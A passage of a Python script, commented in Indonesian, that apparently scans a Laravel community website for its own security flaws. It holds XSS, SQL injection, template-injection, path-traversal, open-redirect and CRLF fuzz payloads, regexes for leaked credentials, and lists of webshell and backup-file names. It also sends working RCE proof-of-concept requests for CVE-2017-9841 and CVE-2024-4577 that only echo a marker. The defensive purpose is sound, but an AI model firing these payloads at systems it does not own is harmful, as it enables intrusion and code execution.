    home = fetch(base + "/")
    server = home.header("server")
    if re.search(r"\d", server):
        report.add("headers", "WARN", "Header Server memperlihatkan versi", server)
    else:
        report.add("headers", "PASS", "Header Server tidak memperlihatkan versi", server or "tidak ada")

    mixed = sorted(set(re.findall(r'(?:src|href)="(http://[^"]+)"', home.text)))
    report.add("headers", "FAIL" if mixed else "PASS", "Konten campuran (http di halaman https) " + ("ditemukan" if mixed else "tidak ada"), ", ".join(mixed[:5]))

    blank_links = re.findall(r"<a\b[^>]*target=\"_blank\"[^>]*>", home.text)
    unsafe = [link for link in blank_links if "noopener" not in link and "noreferrer" not in link]
    report.add("headers", "WARN" if unsafe else "PASS", f"Tautan target=_blank {'tanpa rel=noopener: ' + str(len(unsafe)) if unsafe else 'aman (memakai noopener)'}")

    comments = re.findall(r"<!--(.*?)-->", home.text, flags=re.S)
    suspicious = [comment.strip()[:80] for comment in comments if re.search(r"password|todo|debug|api[_-]?key|secret|token", comment, re.I)]
    report.add("headers", "WARN" if suspicious else "PASS", "Komentar HTML " + ("berisi kata sensitif" if suspicious else "tidak membocorkan informasi"), "; ".join(suspicious[:3]))


def check_input_handling(base: str, report: Report) -> None:
    report.heading("8d. Penanganan input (XSS, SQL injection, parameter aneh)")
    marker = "nh" + secrets.token_hex(3)
    xss = f'"><svg/onload=alert(1)>{marker}'
    sql = "' OR '1'='1"
    probes = [
        ("/galeri", {"kategori": xss}),
        ("/ziswaf/laporan", {"kategori": xss}),
        ("/galeri", {"kategori": sql, "halaman": "1"}),
        ("/ziswaf/laporan", {"kategori": sql, "page": "-1"}),
        ("/galeri", {"halaman": "abc"}),
        ("/galeri", {"halaman": "99999"}),
        ("/galeri/album/" + urllib.parse.quote(xss, safe=""), {}),
        ("/agenda/" + urllib.parse.quote("../../.env", safe="") + "/kalender.ics", {}),
        ("/" + urllib.parse.quote(xss, safe=""), {}),
    ]
    sql_errors = ("SQLSTATE", "syntax error", "mysql_", "PDOException", "QueryException")

    for path, params in probes:
        url = base + path + ("?" + urllib.parse.urlencode(params) if params else "")
        response = fetch(url, follow=False)
        label = (path + ("?" + urllib.parse.urlencode(params) if params else ""))[:90]
        if f"<svg/onload=alert(1)>{marker}" in response.text:
            report.add("input", "FAIL", f"Reflected XSS: input muncul tanpa di-escape", label)
        elif any(error.lower() in response.text.lower() for error in sql_errors):
            report.add("input", "FAIL", "Pesan error database terlihat", label)
        elif response.status >= 500 or response.status == 0:
            report.add("input", "FAIL", f"Server error {response.status} untuk input aneh", label)
        elif response.status == 403:
            # Firewall hosting (WAF) memblokir sebelum sampai ke Laravel; aplikasinya sendiri tidak teruji di sini.
            report.add("input", "PASS", "403 · diblokir firewall hosting sebelum sampai ke aplikasi", label)
        else:
            report.add("input", "PASS", f"{response.status} · aman", label)


class _TokenParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__()
        self.token = ""

    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag == "input" and attrs.get("name") == "_token":
            self.token = attrs.get("value", "")


def check_login_protection(base: str, report: Report, attempts: int) -> None:
    report.heading("8e. Perlindungan login (CSRF dan brute force)")
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=SSL_CONTEXT), urllib.request.HTTPCookieProcessor(jar), NoRedirect)
    form_headers = {"Content-Type": "application/x-www-form-urlencoded", "Referer": base + "/login"}

    no_token = fetch(base + "/login", method="POST", follow=False, data=b"email=a%40b.c&password=x", headers=form_headers)
    report.add("auth", "PASS" if no_token.status == 419 else "FAIL", f"Login tanpa token CSRF → {no_token.status}" + (" (ditolak)" if no_token.status == 419 else " (harus 419)"))

    if attempts <= 0:
        report.add("auth", "INFO", "Uji brute force dilewati (--login-attempts 0)")
        return

    page = fetch(base + "/login", opener=opener)
    parser = _TokenParser()
    parser.feed(page.text)
    if not parser.token:
        report.add("auth", "WARN", "Token CSRF tidak ditemukan di halaman masuk; uji brute force dilewati")
        return

    # Email acak yang tidak ada, jadi tidak ada akun sungguhan yang terkunci.
    email = f"uji-keamanan-{secrets.token_hex(4)}@contoh.invalid"
    locked_at = None
    for attempt in range(1, attempts + 1):
        body = urllib.parse.urlencode({"_token": parser.token, "email": email, "password": "salah-" + secrets.token_hex(4)}).encode()
        response = fetch(base + "/login", method="POST", follow=False, data=body, headers=form_headers, opener=opener)
        if response.status == 429:
            locked_at = attempt
            break
        after = fetch(base + "/login", opener=opener)
        text = after.text.lower()
        if "terlalu banyak" in text or "too many" in text:
            locked_at = attempt
            break
        refreshed = _TokenParser()
        refreshed.feed(after.text)
        parser.token = refreshed.token or parser.token

    if locked_at:
        report.add("auth", "PASS", f"Login dikunci sementara setelah {locked_at} percobaan salah (rate limit aktif)", f"email uji: {email}")
    else:
        report.add("auth", "FAIL", f"Tidak ada penguncian setelah {attempts} percobaan login salah", "Penyerang bisa menebak password tanpa batas")

    for path in ("/forgot-password", "/reset-password/token-uji"):
        response = fetch(base + path, follow=False)
        report.add("auth", "INFO" if response.status == 200 else "PASS",
                   f"{path} → {response.status}" + (" (halaman lupa password masih terbuka, padahal email belum disetel)" if response.status == 200 else ""))


def dns_query(name: str, record: str) -> list[str]:
    url = "https://dns.google/resolve?" + urllib.parse.urlencode({"name": name, "type": record})
    response = fetch(url, headers={"Accept": "application/dns-json"})
    if response.status != 200:
        return []
    try:
        return [answer.get("data", "").strip('"') for answer in json.loads(response.text).get("Answer", [])]
    except ValueError:
        return []


def check_dns(base: str, report: Report) -> None:
    report.heading("8f. DNS dan keamanan email domain")
    domain = urllib.parse.urlsplit(base).hostname.removeprefix("www.")

    spf = [record for record in dns_query(domain, "TXT") if record.lower().startswith("v=spf1")]
    report.add("dns", "PASS" if spf else "WARN", "SPF " + ("ada" if spf else "belum ada (orang lain bisa memalsukan email @" + domain + ")"), spf[0] if spf else "")

    dmarc = [record for record in dns_query("_dmarc." + domain, "TXT") if record.lower().startswith("v=dmarc1")]
    if dmarc:
        policy = re.search(r"p=(\w+)", dmarc[0])
        strong = policy and policy.group(1).lower() in ("quarantine", "reject")
        report.add("dns", "PASS" if strong else "WARN", "DMARC ada" + ("" if strong else " tapi kebijakannya p=none (hanya memantau)"), dmarc[0])
    else:
        report.add("dns", "WARN", "DMARC belum ada (email palsu atas nama domain tidak ditolak)")

    caa = dns_query(domain, "CAA")
    report.add("dns", "PASS" if caa else "INFO", "CAA " + ("ada" if caa else "belum ada (opsional: batasi penerbit sertifikat SSL)"), ", ".join(caa))

    dnssec = fetch("https://dns.google/resolve?" + urllib.parse.urlencode({"name": domain, "type": "A"}))
    try:
        secured = json.loads(dnssec.text).get("AD", False)
    except ValueError:
        secured = False
    report.add("dns", "PASS" if secured else "INFO", "DNSSEC " + ("aktif" if secured else "tidak aktif (opsional)"))


# --------------------------------------------------------------------------------------------
# Pemeriksaan mendalam: crawl semua halaman, kredensial bocor, dan fuzzing parameter
# --------------------------------------------------------------------------------------------

# Pola kredensial yang tidak boleh muncul di HTML/JS/CSS publik. (nama, pola, tingkat)
SECRET_PATTERNS = [
    ("Laravel APP_KEY", r"base64:[A-Za-z0-9+/]{42,44}={0,2}", "FAIL"),
    ("Google API key", r"AIza[0-9A-Za-z_\-]{35}", "WARN"),
    ("Google OAuth client secret", r"GOCSPX-[0-9A-Za-z_\-]{20,}", "FAIL"),
    ("AWS access key", r"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b", "FAIL"),
    ("Stripe secret key", r"\bsk_(?:live|test)_[0-9A-Za-z]{16,}", "FAIL"),
    ("GitHub token", r"\bgh[pousr]_[0-9A-Za-z]{36,}", "FAIL"),
    ("Slack token", r"\bxox[abposr]-[0-9A-Za-z\-]{10,}", "FAIL"),
    ("Telegram bot token", r"\b\d{8,10}:AA[0-9A-Za-z_\-]{33}\b", "FAIL"),
    ("Private key", r"-----BEGIN (?:RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----", "FAIL"),
    ("JSON Web Token", r"\beyJ[A-Za-z0-9_\-]{10,}\.eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}", "WARN"),
    ("Firebase / Supabase URL", r"https://[a-z0-9\-]+\.(?:firebaseio\.com|supabase\.co)", "WARN"),
    ("Password di kode", r"""(?i)(?:db_password|mail_password|password|passwd|pwd)\s*[:=]\s*["'][^"'\s]{4,}["']""", "FAIL"),
    ("Variabel .env", r"\b(?:DB_PASSWORD|DB_USERNAME|APP_KEY|MAIL_PASSWORD|AWS_SECRET_ACCESS_KEY|MAINTENANCE_TOKEN|YOUTUBE_API_KEY)\s*=", "FAIL"),
    ("Path server", r"/home/u\d+/|/home/[a-z0-9_]+/(?:domains|public_html)|[A-Z]:\\\\(?:xampp|laragon|wamp)", "WARN"),
    ("Alamat IP internal", r"\b(?:10\.\d{1,3}|192\.168|172\.(?:1[6-9]|2\d|3[01]))\.\d{1,3}\.\d{1,3}\b", "WARN"),
    ("Token halaman perawatan", r"/dashboard/perawatan/[A-Za-z0-9]{8,}", "FAIL"),
]

# Payload uji. (nama, nilai, cara mendeteksi)
#   reflect: payload muncul utuh tanpa di-escape → XSS
#   ssti:    hasil perhitungan 7*7 muncul → template injection
#   generic: hanya cek error 500 / error database / stack trace
FUZZ_PAYLOADS = [
    ("XSS tag", '"><svg/onload=alert(1)>{m}', "reflect"),
    ("XSS atribut", "' autofocus onfocus=alert(1) x='{m}", "reflect"),
    ("XSS javascript:", "javascript:alert(1)//{m}", "reflect"),
    ("SQL injection kutip", "'{m}", "generic"),
    ("SQL injection OR", "' OR '1'='1' -- {m}", "generic"),
    ("SQL injection UNION", "1 UNION SELECT NULL,NULL-- {m}", "generic"),
    ("Template injection Blade/Twig", "{m}{{7*7}}{m}", "ssti"),
    ("Template injection ${}", "{m}${7*7}{m}", "ssti"),
    ("Path traversal", "../../../../.env", "generic"),
    ("Null byte", "{m}%00.php", "generic"),
    ("Input sangat panjang", "A" * 5000, "generic"),
    ("Karakter unicode", "‮\u0000﻿{m}", "generic"),
]

ARRAY_PAYLOAD_NOTE = "parameter dikirim sebagai array (param[]=x)"
REDIRECT_PARAMS = ["redirect", "url", "next", "return", "returnUrl", "redirect_to", "continue", "intended"]
DB_ERROR_MARKERS = ("SQLSTATE", "PDOException", "QueryException", "You have an error in your SQL syntax", "mysqli_", "Warning: pg_")
SKIP_CRAWL = ("/logout", "/storage/", "/build/", ".pdf", ".jpg", ".jpeg", ".png", ".webp", ".ics", ".xml", ".txt", ".zip")


def mask(secret: str) -> str:
    return secret[:6] + "…" + secret[-3:] if len(secret) > 12 else secret[:3] + "…"


def crawl(base: str, start: list[str], limit: int, opener=None, delay: float = 0.0) -> dict[str, tuple[Response, PageParser]]:
    """Ikuti semua tautan internal (hanya GET) sampai `limit` halaman."""
    queue = list(dict.fromkeys(start))
    seen: set[str] = set(queue)
    pages: dict[str, tuple[Response, PageParser]] = {}

    while queue and len(pages) < limit:
        url = queue.pop(0)
        response = fetch(url, opener=opener)
        if delay:
            time.sleep(delay)
        if "text/html" not in response.header("content-type"):
            continue
        page = parse(response.text)
        pages[url] = (response, page)
        for href in page.links:
            absolute = normalize(href, response.final_url or url)
            if not absolute or not same_site(absolute, base) or absolute in seen:
                continue
            if any(part in absolute.lower() for part in SKIP_CRAWL):
                continue
            seen.add(absolute)
            queue.append(absolute)

    return pages


def check_crawl(base: str, pages: dict[str, tuple[Response, PageParser]], report: Report, label: str) -> None:
    errors = [(url, response) for url, (response, _) in pages.items() if response.status >= 400 or response.status == 0]
    leaks = []
    for url, (response, _) in pages.items():
        for marker, meaning in LEAK_MARKERS.items():
            if marker in response.text:
                leaks.append((url, meaning))
    report.add("crawl", "FAIL" if errors else "PASS", f"{label}: {len(pages)} halaman dijelajahi, {len(errors)} bermasalah")
    for url, response in errors[:20]:
        report.add("crawl", "FAIL", f"{urllib.parse.urlsplit(url).path} → status {response.status}", response.error)
    for url, meaning in leaks[:10]:
        report.add("crawl", "FAIL", f"{urllib.parse.urlsplit(url).path}: {meaning}")

    forms = sum(len(page.forms) for _, page in pages.values())
    params = sorted({key for url in pages for key in urllib.parse.parse_qs(urllib.parse.urlsplit(url).query)})
    report.add("crawl", "INFO", f"{label}: {forms} form ditemukan · parameter URL: {', '.join(params) or '-'}")


def check_secrets(base: str, pages: dict[str, tuple[Response, PageParser]], report: Report) -> None:
    report.heading("9b. Kredensial dan informasi bocor di HTML, JS, CSS")
    sources: dict[str, str] = {}
    assets: set[str] = set()

    for url, (response, page) in pages.items():
        sources[url] = response.text
        for index, script in enumerate(page.inline_scripts):
            sources[f"{url} (script inline #{index + 1})"] = script
        for src in page.scripts + page.styles:
            absolute = normalize(src, url)
            if absolute and same_site(absolute, base):
                assets.add(absolute)
    assets.update(base + path for path in ("/site.webmanifest", "/build/manifest.json", "/robots.txt", "/sitemap.xml"))

    with futures.ThreadPoolExecutor(max_workers=6) as pool:
        fetched = list(pool.map(lambda url: (url, fetch(url)), sorted(assets)))
    for url, response in fetched:
        if response.status == 200:
            sources[url] = response.text

    # Source map memperlihatkan kode sumber asli.
    maps = [url + ".map" for url, _ in fetched if url.endswith((".js", ".css"))]
    with futures.ThreadPoolExecutor(max_workers=6) as pool:
        map_results = list(pool.map(lambda url: (url, fetch(url, follow=False)), maps))
    exposed_maps = [url for url, response in map_results if response.status == 200 and response.body[:1] == b"{"]
    for url, text in list(sources.items()):
        if "sourceMappingURL=" in text and url.endswith((".js", ".css")):
            exposed_maps.append(url + " (sourceMappingURL)")
    report.add("secrets", "WARN" if exposed_maps else "PASS",
               "Source map " + ("terbuka: " + ", ".join(urllib.parse.urlsplit(u).path for u in exposed_maps[:5]) if exposed_maps else "tidak terbuka (kode sumber asli tidak bisa diunduh)"))

    findings: dict[tuple[str, str], list[str]] = {}
    for url, text in sources.items():
        for name, pattern, level in SECRET_PATTERNS:
            for match in set(re.findall(pattern, text)):
                found = match if isinstance(match, str) else match[0]
                findings.setdefault((name, level), []).append(f"{urllib.parse.urlsplit(url).path or url} → {mask(found)}")

    report.add("secrets", "INFO", f"{len(sources)} sumber dipindai ({len(fetched)} berkas aset + HTML + script inline)")
    if not findings:
        report.add("secrets", "PASS", f"Tidak ada kredensial bocor ({len(SECRET_PATTERNS)} pola: APP_KEY, API key, token, private key, password, path server, dll.)")
    for (name, level), places in sorted(findings.items()):
        report.add("secrets", level, f"{name} ditemukan di {len(places)} tempat", "; ".join(places[:4]))

    emails = sorted({email for text in sources.values() for email in re.findall(r"[\w.+-]+@[\w-]+\.[\w.]+", text)
                     if not email.endswith((".png", ".jpg", ".webp", ".js", ".css")) and "example" not in email})
    if emails:
        report.add("secrets", "INFO", f"Alamat email terlihat di situs ({len(emails)}), pastikan memang untuk publik", ", ".join(emails[:6]))


def build_fuzz_targets(base: str, pages: dict[str, tuple[Response, PageParser]]) -> list[dict]:
    """Daftar parameter/form yang akan diuji: parameter URL, form GET, form POST publik, dan segmen path."""
    targets: list[dict] = []
    seen: set[tuple] = set()

    def add(target: dict) -> None:
        key = (target["kind"], target["url"], target.get("param"), target.get("method", "get"))
        if key not in seen:
            seen.add(key)
            targets.append(target)

    for url, (response, page) in pages.items():
        parts = urllib.parse.urlsplit(url)
        clean = urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path, "", ""))
        query = urllib.parse.parse_qs(parts.query)

        for param in query:
            add({"kind": "query", "url": clean, "param": param, "base_params": {k: v[0] for k, v in query.items()}})

        for form in page.forms:
            action = normalize(form["action"], url) or url
            if not same_site(action, base):
                continue
            names = [field["name"] for field in form["fields"] if field["type"] not in ("submit", "button", "file", "hidden")]
            for name in names:
                add({"kind": "form", "url": action, "param": name, "method": form["method"], "page": url,
                     "fields": {field["name"]: field["value"] or "uji" for field in form["fields"] if field["type"] not in ("submit", "button", "file")}})

        # Segmen terakhir path detail (slug album, artikel, agenda) juga dicoba.
        segments = [segment for segment in parts.path.split("/") if segment]
        if len(segments) >= 2:
            add({"kind": "path", "url": clean, "param": "/".join(segments[:-1])})

    # Parameter umum yang sering dipakai untuk open redirect.
    for param in REDIRECT_PARAMS:
        add({"kind": "redirect", "url": base + "/login", "param": param})
        add({"kind": "redirect", "url": base + "/", "param": param})

    return targets


def fuzz_request(base: str, target: dict, value: str, opener=None, token: str = "") -> Response:
    if target["kind"] == "path":
        return fetch(f"{base}/{target['param']}/{urllib.parse.quote(value, safe='')}", follow=False, opener=opener)
    if target["kind"] in ("query", "redirect"):
        params = dict(target.get("base_params", {}))
        params[target["param"]] = value
        return fetch(target["url"] + "?" + urllib.parse.urlencode(params), follow=False, opener=opener)

    fields = dict(target["fields"])
    fields[target["param"]] = value
    if target["method"] == "get":
        return fetch(target["url"] + "?" + urllib.parse.urlencode(fields), follow=False, opener=opener)
    if token:
        fields["_token"] = token
    if "email" in fields and target["param"] != "email":
        # Email acak agar uji form masuk tidak mengunci akun mana pun.
        fields["email"] = f"fuzz-{secrets.token_hex(4)}@contoh.invalid"
    body = urllib.parse.urlencode(fields).encode()
    return fetch(target["url"], method="POST", follow=False, data=body, opener=opener,
                 headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": target.get("page", base)})


def analyse(response: Response, kind: str, value: str, marker: str) -> tuple[str, str]:
    """Hasil: (level, alasan). Level PASS/WARN/FAIL/WAF."""
    text = response.text
    if response.status == 403 and ("hcdn" in response.header("server") or "<html" in text.lower()):
        return "WAF", "diblokir firewall hosting"
    if response.status == 0:
        return "WARN", f"koneksi gagal: {response.error[:60]}"
    if response.status >= 500:
        return "FAIL", f"server error {response.status}"
    for error in DB_ERROR_MARKERS:
        if error.lower() in text.lower():
            return "FAIL", f"pesan error database terlihat ({error})"
    for leak, meaning in LEAK_MARKERS.items():
        if leak in text and "5173" not in leak:
            return "FAIL", meaning
    if kind == "reflect" and value in text:
        return "FAIL", "payload dipantulkan tanpa di-escape (XSS)"
    if kind == "ssti" and f"{marker}49{marker}" in text:
        return "FAIL", "ekspresi 7*7 dievaluasi server (template injection)"
    location = response.header("location")
    if location and urllib.parse.urlsplit(location).netloc and "situs-jahat.example" in location:
        return "FAIL", f"open redirect ke {location}"
    if "x-injected" in response.headers:
        return "FAIL", "CRLF injection: header buatan muncul di respons"
    return "PASS", str(response.status)


def check_fuzz(base: str, pages: dict[str, tuple[Response, PageParser]], report: Report, max_requests: int, delay: float, opener=None, label: str = "publik") -> None:
    targets = build_fuzz_targets(base, pages)
    counts = {"PASS": 0, "WAF": 0, "WARN": 0, "FAIL": 0}
    failures: list[str] = []
    sent = 0

    token = ""
    session_opener = opener
    if any(target["kind"] == "form" and target["method"] == "post" for target in targets):
        jar = http.cookiejar.CookieJar()
        session_opener = opener or urllib.request.build_opener(urllib.request.HTTPSHandler(context=SSL_CONTEXT), urllib.request.HTTPCookieProcessor(jar), NoRedirect)
        login_page = fetch(base + "/login", opener=session_opener)
        token_parser = _TokenParser()
        token_parser.feed(login_page.text)
        token = token_parser.token

    report.add("fuzz", "INFO", f"{len(targets)} titik masukan ({label}) · {len(FUZZ_PAYLOADS) + 3} jenis payload · maks {max_requests} permintaan")

    def record(target: dict, name: str, response: Response, verdict: tuple[str, str]) -> None:
        level, reason = verdict
        counts[level] += 1
        if level in ("FAIL", "WARN"):
            where = f"{target['kind']} {urllib.parse.urlsplit(target['url']).path} [{target['param']}]"
            failures.append(f"{level}: {name} → {where}: {reason}")

    for target in targets:
        if sent >= max_requests:
            break
        payloads = list(FUZZ_PAYLOADS)
        if target["kind"] == "redirect":
            payloads = [("Open redirect //", "//situs-jahat.example/{m}", "generic"), ("Open redirect https", "https://situs-jahat.example/{m}", "generic")]
        for name, template, kind in payloads:
            if sent >= max_requests:
                break
            marker = "nh" + secrets.token_hex(3)
            value = template.replace("{m}", marker)
            post_with_token = target["kind"] == "form" and target["method"] == "post"
            response = fuzz_request(base, target, value, opener=session_opener if post_with_token else opener, token=token)
            sent += 1
            record(target, name, response, analyse(response, kind, value, marker))
            if delay:
                time.sleep(delay)

        # Parameter dikirim sebagai array dan percobaan CRLF injection, khusus parameter URL.
        if target["kind"] == "query" and sent + 2 <= max_requests:
            params = dict(target.get("base_params", {}))
            params.pop(target["param"], None)
            query = urllib.parse.urlencode(params) + ("&" if params else "") + urllib.parse.quote(target["param"]) + "[]=x"
            response = fetch(target["url"] + "?" + query, follow=False, opener=opener)
            record(target, "Parameter array", response, analyse(response, "generic", "", ""))
            crlf = fetch(target["url"] + "?" + urllib.parse.quote(target["param"]) + "=x%0d%0aX-Injected:%20ya", follow=False, opener=opener)
            record(target, "CRLF injection", crlf, analyse(crlf, "generic", "", ""))
            sent += 2

    level = "FAIL" if counts["FAIL"] else "WARN" if counts["WARN"] else "PASS"
    report.add("fuzz", level, f"Fuzzing {label}: {sent} permintaan · {counts['PASS']} ditangani aman · {counts['WAF']} diblokir firewall · {counts['WARN']} peringatan · {counts['FAIL']} celah")
    for line in failures[:25]:
        report.add("fuzz", "FAIL" if line.startswith("FAIL") else "WARN", line.split(": ", 1)[1])
    if counts["WAF"] and counts["WAF"] > counts["PASS"]:
        report.add("fuzz", "INFO", "Sebagian besar payload diblokir firewall hosting, jadi tidak sampai ke aplikasi",
                   "Tes otomatis di kode (php artisan test) tetap memastikan aplikasi meng-escape input")


def login_opener(base: str, email: str, password: str):
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=SSL_CONTEXT), urllib.request.HTTPCookieProcessor(jar), NoRedirect)
    page = fetch(base + "/login", opener=opener)
    token_parser = _TokenParser()
    token_parser.feed(page.text)
    body = urllib.parse.urlencode({"_token": token_parser.token, "email": email, "password": password}).encode()
    response = fetch(base + "/login", method="POST", data=body, opener=opener,
                     headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": base + "/login"})
    ok = response.status in (302, 303) and "/dashboard" in response.header("location")
    return (opener if ok else None), response


def check_deep(base: str, report: Report, args) -> None:
    report.heading("9a. Jelajah semua halaman publik")
    # /login ikut dijelajahi walau tidak ditautkan dari menu, agar form masuk ikut di-fuzz.
    start = [base + "/", base + "/login"]
    sitemap = fetch(base + "/sitemap.xml")
    start += re.findall(r"<loc>([^<]+)</loc>", sitemap.text)
    pages = crawl(base, start, args.crawl_limit, delay=args.delay)
    check_crawl(base, pages, report, "Publik")

    check_secrets(base, pages, report)

    report.heading("9c. Fuzzing parameter, form, dan path (publik)")
    check_fuzz(base, pages, report, args.max_fuzz, args.delay)

    if args.auth_email:
        import getpass
        import os

        report.heading("9d. Jelajah dashboard (login, hanya GET, tanpa mengubah data)")
        password = os.environ.get("LIVE_CHECK_PASSWORD") or getpass.getpass(f"Password untuk {args.auth_email}: ")
        opener, response = login_opener(base, args.auth_email, password)
        if opener is None:
            report.add("auth", "FAIL", "Login dashboard gagal; pemeriksaan dashboard dilewati", f"status {response.status} → {response.header('location')}")
            return
        report.add("auth", "PASS", "Login dashboard berhasil")
        dashboard = crawl(base, [base + "/dashboard"], args.crawl_limit, opener=opener, delay=args.delay)
        dashboard = {url: value for url, value in dashboard.items() if "/dashboard" in url or "/profile" in url}
        check_crawl(base, dashboard, report, "Dashboard")
        check_secrets(base, dashboard, report)
        # Hanya parameter GET yang diuji di dashboard; form POST/PUT/DELETE tidak pernah dikirim.
        for url, (response_page, page) in dashboard.items():
            page.forms = [form for form in page.forms if form["method"] == "get"]
        check_fuzz(base, dashboard, report, max(50, args.max_fuzz // 3), args.delay, opener=opener, label="dashboard")
        fetch(base + "/logout", method="POST", data=b"", opener=opener)



# --------------------------------------------------------------------------------------------
# Uji eksploitasi tingkat lanjut (RCE, webshell, LFI, SSRF, bypass auth)
#
# PERINGATAN: bagian ini mengirim payload yang menyerupai serangan sungguhan (CVE-2024-4577,
# CVE-2017-9841 PHPUnit, Laravel Ignition CVE-2021-3129, path traversal, SSRF, dll.).
# Semua PoC hanya meminta server MENCETAK penanda acak (echo/md5) atau sekadar mengecek status;
# tidak ada perintah yang menghapus/mengubah apa pun. JALANKAN HANYA TERHADAP SITUS MILIK ANDA.
# --------------------------------------------------------------------------------------------

# Webshell dan dropper yang sering ditanam penyerang (di root publik dan folder unggahan).
WEBSHELL_NAMES = [
    "shell.php", "c99.php", "r57.php", "wso.php", "wso112233.php", "alfa.php", "alfav3.php",
    "b374k.php", "cmd.php", "up.php", "upload.php", "indoxploit.php", "gel4y.php", "mini.php",
    "0byt3m1n1.php", "x.php", "1.php", "2.php", "a.php", "z.php", "eval.php", "webshell.php",
    "backdoor.php", "shell.phtml", "shell.php5", "shell.php7", "shell.pht", "sh.php", "dropper.php",
    "wp.php", "radio.php", "lol.php", "madspot.php", "priv8.php", "bypass.php", "sym.php", "config.php.suspected",
]

UPLOAD_DIRS = ["", "storage/", "storage/galeri/", "storage/galeri/seed/", "storage/laporan/", "storage/ziswaf/", "storage/tpq/", "storage/artikel/", "uploads/", "files/", "tmp/"]

# Berkas cadangan/sementara yang kadang tertinggal dan membocorkan kode atau kredensial.
BACKUP_FILES = [
    "/index.php~", "/index.php.bak", "/index.php.save", "/index.php.swp", "/.index.php.swp",
    "/config.php.bak", "/wp-config.php", "/.env~", "/.env.swp", "/.env.txt", "/env.txt",
    "/.htaccess.bak", "/.htpasswd", "/composer.phar", "/dump.sql", "/data.sql", "/users.sql",
    "/site.zip", "/www.zip", "/html.zip", "/app.zip", "/laravel.zip", "/source.zip", "/old.zip",
    "/.vscode/sftp.json", "/.ftpconfig", "/sftp-config.json", "/deploy.php", "/install.php",
    "/.git/", "/.git/index", "/.svn/entries", "/.hg/", "/.bzr/", "/CVS/Root",
    "/server-status", "/server-info", "/.well-known/", "/cgi-bin/",
]


def check_known_exploit_paths(base: str, report: Report) -> None:
    report.heading("10a. Berkas berbahaya dan alat yang sering dieksploitasi")

    def probe(path: str) -> tuple[str, Response]:
        return path, fetch(base + path, follow=False)

    shells = [directory + name for directory in UPLOAD_DIRS for name in WEBSHELL_NAMES]
    with futures.ThreadPoolExecutor(max_workers=10) as pool:
        shell_results = list(pool.map(probe, ["/" + path for path in shells]))
    found = [path for path, response in shell_results if response.status == 200 and response.body]
    if found:
        for path in found:
            report.add("exploit", "FAIL", f"Kemungkinan webshell dapat diakses: {path}", "SEGERA hapus dan ganti semua password!")
    else:
        report.add("exploit", "PASS", f"Tidak ada webshell terdeteksi ({len(shells)} nama dicoba di {len(UPLOAD_DIRS)} folder)")

    with futures.ThreadPoolExecutor(max_workers=8) as pool:
        backup_results = list(pool.map(probe, BACKUP_FILES))
    exposed = []
    for path, response in backup_results:
        if response.status == 200 and response.body:
            sample = response.text[:300].lower()
            if path.endswith("/") and "index of" not in sample:
                continue
            if "<!doctype html" in sample and "index of" not in sample and path not in ("/.well-known/", "/cgi-bin/"):
                continue
            exposed.append(path)
    if exposed:
        for path in exposed:
            report.add("exploit", "FAIL", f"Berkas/direktori sensitif terbuka: {path}")
    else:
        report.add("exploit", "PASS", f"{len(BACKUP_FILES)} berkas cadangan/VCS (.git, .zip, dump.sql, *.bak, server-status) tidak terbuka")


def rce_marker() -> tuple[str, str]:
    import hashlib
    marker = "RCE" + secrets.token_hex(6)
    return marker, hashlib.md5(marker.encode()).hexdigest()


def check_rce(base: str, report: Report) -> None:
    report.heading("10b. Uji RCE (CVE-2024-4577, PHPUnit, Ignition, eksekusi PHP di folder unggahan)")

    # --- CVE-2017-9841: PHPUnit eval-stdin.php (vektor "php2shell" paling sering dipakai) ---
    marker, digest = rce_marker()
    payload = f"<?php echo md5('{marker}'); ?>".encode()
    phpunit_paths = [
        "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php",
        "/vendor/phpunit/src/Util/PHP/eval-stdin.php",
        "/vendor/phpunit/Util/PHP/eval-stdin.php",
        "/phpunit/src/Util/PHP/eval-stdin.php",
        "/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    ]
    hit = False
    for path in phpunit_paths:
        response = fetch(base + path, method="POST", data=payload, follow=False, headers={"Content-Type": "text/plain"})
        if digest in response.text:
            report.add("exploit", "FAIL", f"CVE-2017-9841: PHPUnit eval-stdin.php MENGEKSEKUSI PHP di {path}", "RCE penuh! Hapus folder vendor dari public_html dan ganti kredensial.")
            hit = True
        elif response.status == 200 and response.body and "<?php" not in response.text:
            report.add("exploit", "WARN", f"PHPUnit eval-stdin.php bisa diakses (status 200) di {path}", "tidak mengeksekusi penanda, tapi sebaiknya tidak terbuka")
            hit = True
    if not hit:
        report.add("exploit", "PASS", "CVE-2017-9841: PHPUnit eval-stdin.php tidak dapat diakses / tidak mengeksekusi PHP")

    # --- CVE-2024-4577: PHP-CGI argument injection (Windows; Linux harusnya kebal) ---
    marker, digest = rce_marker()
    body = f"<?php echo md5('{marker}'); die(); ?>".encode()
    cgi_payloads = [
        "/index.php?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input",
        "/?%ADd+allow_url_include%3d1+%add+auto_prepend_file%3dphp://input",
        "/index.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
    ]
    vulnerable = False
    for path in cgi_payloads:
        response = fetch(base + path, method="POST", data=body, follow=False, headers={"Content-Type": "application/x-www-form-urlencoded"})
        if digest in response.text:
            vulnerable = True
    report.add("exploit", "FAIL" if vulnerable else "PASS",
               "CVE-2024-4577 (PHP-CGI injection): " + ("SERVER DAPAT DIEKSEKUSI JARAK JAUH!" if vulnerable else "tidak rentan (server tidak menjalankan PHP sebagai CGI)"))

    # --- Laravel Ignition CVE-2021-3129 (butuh APP_DEBUG=true) ---
    health = fetch(base + "/_ignition/health-check", follow=False)
    execute = fetch(base + "/_ignition/execute-solution", method="POST", data=b"{}", follow=False, headers={"Content-Type": "application/json"})
    if health.status == 200 or execute.status not in (404, 405):
